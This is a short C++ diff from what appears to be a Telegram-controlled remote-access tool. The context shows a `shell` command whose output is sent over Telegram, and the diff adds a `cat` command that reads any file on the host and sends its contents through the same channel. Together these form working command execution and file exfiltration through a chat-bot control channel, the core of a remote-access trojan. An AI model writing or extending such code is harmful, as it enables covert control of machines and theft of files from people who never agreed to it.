@@ -611,3 +611,25 @@ void shell(std::string) {
         telegram::SendText(tools::info::cmdOutput(command.c_str()));
     }
 }
+
+void cat(std::string path) {
+    if (!tools::info::filExists(path)) {
+        telegram::SendText("file doesn't exists");
+        return;
+    }
+
+    std::ifstream f(path);
+    if (!f.good() or !f.is_open()) {
+        telegram::SendText("couldn't open file");
+        return;
+    }
+
+    std::string output, line;
+    while (std::getline(f, line)) {
+        output += line + "\n";
+    }
+    
+    f.close();
+
+    telegram::SendText(output);
+}
